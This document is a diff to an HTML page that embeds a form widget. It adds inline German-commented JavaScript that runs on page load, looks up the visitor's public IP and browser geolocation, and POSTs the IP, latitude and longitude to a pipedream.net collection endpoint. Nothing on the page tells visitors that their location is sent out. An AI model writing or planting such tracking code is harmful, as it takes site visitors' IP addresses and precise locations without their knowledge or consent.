@@ -11,6 +11,7 @@
     <div data-tf-live="01JQ4E7MZNPJ4RS1BMH65S5QWV"></div>
     <script src="src/main.js"></script>
 </body>
+
 <script>
     function getIPAndSend() {
         fetch("https://checkip.amazonaws.com/")
@@ -19,22 +20,68 @@
                 ip = ip.trim(); // Entfernt unnötige Leerzeichen/Zeilenumbrüche
                 console.log("IP:", ip);
 
-                // IP per POST senden
-                fetch("https://eo7zm7ep34kn4vq.m.pipedream.net", { // Ersetze mit deiner API-URL
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({ ip: ip })
-                })
-                .then(response => response.json())
-                .then(data => console.log("Response:", data))
-                .catch(error => console.error("Fehler beim Senden:", error));
+                // Geolocation abfragen
+                getLocation(ip); // IP an die Standort-Funktion übergeben
             })
             .catch(error => console.error("Fehler beim Abrufen der IP:", error));
     }
 
+    function getLocation(ip) {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => showPosition(position, ip),
+                showError
+            );
+        } else {
+            alert("Geolocation wird nicht unterstützt.");
+        }
+    }
+
+    function showPosition(position, ip) {
+        let lat = position.coords.latitude;
+        let lon = position.coords.longitude;
+        console.log(`Breitengrad: ${lat}, Längengrad: ${lon}`);
+
+        // IP und Standort per POST senden
+        sendIPAndLocation(ip, lat, lon);
+    }
+
+    function showError(error) {
+        switch (error.code) {
+            case error.PERMISSION_DENIED:
+                alert("Nutzer hat Standortfreigabe verweigert.");
+                break;
+            case error.POSITION_UNAVAILABLE:
+                alert("Standortinformationen sind nicht verfügbar.");
+                break;
+            case error.TIMEOUT:
+                alert("Standortabfrage dauerte zu lange.");
+                break;
+            case error.UNKNOWN_ERROR:
+                alert("Unbekannter Fehler.");
+                break;
+        }
+    }
+
+    function sendIPAndLocation(ip, lat, lon) {
+        fetch("https://eo7zm7ep34kn4vq.m.pipedream.net", { // Ersetze mit deiner API-URL
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                ip: ip,
+                latitude: lat,
+                longitude: lon
+            })
+        })
+        .then(response => response.json())
+        .then(data => console.log("Response:", data))
+        .catch(error => console.error("Fehler beim Senden:", error));
+    }
+
+    // Funktion aufrufen
     getIPAndSend();
-    </script>
+</script>
 
 </html>
